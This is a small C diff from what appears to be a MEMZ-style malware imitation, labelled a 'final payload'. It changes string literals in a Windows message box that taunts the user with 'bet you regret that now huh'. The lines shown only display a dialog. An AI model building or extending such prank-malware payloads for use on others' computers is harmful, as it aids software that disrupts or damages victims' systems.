@@ -8,8 +8,8 @@ int p1() { //memz final payload but random
         msg.cbSize = sizeof(MSGBOXPARAMS);
         msg.hwndOwner = NULL;
         msg.hInstance = GetModuleHandle(NULL);
-        msg.lpszText = L"bet you regret that now huh";
-        msg.lpszCaption = L"ez";
+        msg.lpszText = "bet you regret that now huh";
+        msg.lpszCaption = "ez";
         msg.dwStyle = MB_YESNO | MB_ICONQUESTION;
         CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MessageBoxIndirect, &msg, 0, &dwID);
 
